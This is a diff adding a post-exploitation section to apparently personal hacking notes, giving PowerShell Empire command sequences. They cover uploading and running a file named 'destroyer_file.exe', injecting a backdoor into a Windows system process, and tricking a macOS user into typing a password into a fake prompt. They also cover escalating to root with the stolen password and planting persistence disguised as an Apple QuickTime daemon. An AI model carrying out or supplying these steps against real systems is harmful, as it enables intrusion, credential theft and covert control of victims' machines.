@@ -1871,10 +1871,128 @@ meterpreter > ifconfig
 
 --------------------------------------------------------------------------------------------------------------------------------------------
 
+Post Exploitation Part (4)
+-------------------------
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
 
+"Let pratice with Powershell Empire"
 
+> powershell-empire
+> agents
 
+> interact agent_name
 
+> help
+> sysinfo
+> whoami
+> ifconfig
+> pwd
+> dir
+> download file_name
+> upload file_name
+> execute ./destroyer_file.exe
+
+> help agentcmds
+
+> back
+> list
+
+"Injecting a Back Door in a System Process on Window"
+
+> powershell-empire
+> agents
+
+> interact agent_name
+
+> usemodule
+
+"The following cmd is use for injecting Back Door in System Process on Window"
+
+> usemodule management/psinject
+> info
+> set ProcId process_id
+
+"Look for Process ID in Target PC by typing this (ps) in Terminal"
+
+> set Listener http
+> info
+> execute
+
+> back
+
+> list
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+Post Exploitation Part (4)
+-------------------------
+   _______ .___  ___. .______    __  .______       _______
+  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
+  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
+  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
+  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
+  |_______||__|  |__| | _|      |__| | _| `._____||_______|
+
+Escalating Privileges on OS X
+-----------------------------
+> powershell-empire
+> agents
+> interact agent_name
+> usemodule
+> usemodule collection/osx/prompt
+> info
+> execute
+
+"It will prompt password input dialog on target PC and Victim enter password and Hacker will get it"
+
+> whoami
+
+"Currently it is Normal User"
+
+> usemodule
+> usemodule privesc/multi/sudo_spawn
+> info
+> set Password password_from_victim
+> set Listener listener_name
+> info
+> execute
+
+> back
+> list
+
+"You will see root in Username column"
+"Interact with Agent that has root"
+
+> interact agent_name
+> whoami
+
+root
+
+Post Exploitation for Mac Book
+-----------------------------
+> powershell-empire
+> agents
+> interact agent_name
+> usemodule
+> usemodule persistence/osx/launchdaemonexecutable
+> info
+> set DaemonLocation /Library/Application Support/QuickTimeDaemon
+> set Listener listener_name
+> set DaemonName com.apple.QuickTime
+> execute
+
+> agents
+
+"Restart Target Mac Book"
+
+> agents
+> interact agent_name
+> sysinfo
 
 
 
